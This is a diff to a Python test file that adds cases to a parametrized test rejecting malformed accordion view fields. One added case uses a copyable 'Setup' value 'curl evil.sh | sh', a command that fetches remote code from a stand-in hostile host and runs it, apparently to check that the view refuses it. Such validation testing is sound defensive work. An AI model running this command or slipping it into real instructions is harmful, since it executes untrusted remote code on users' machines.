@@ -214,6 +214,8 @@ def test_accordion_fields_pass_the_check():
     lambda i: i["detail"][0].update(html="<b>"),
     lambda i: i["detail"].extend([{"label": "x"}] * 12),
     lambda i: i.update(actions=[i["actions"][0]] * 5),
+    lambda i: i["detail"].append({"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}),
+    lambda i: i["detail"].append({"label": "Setup", "lines": ["Daily at 9"], "copy": True}),
 ])
 def test_bad_accordion_fields_break_the_view(mutate):
     v = _acc_view()
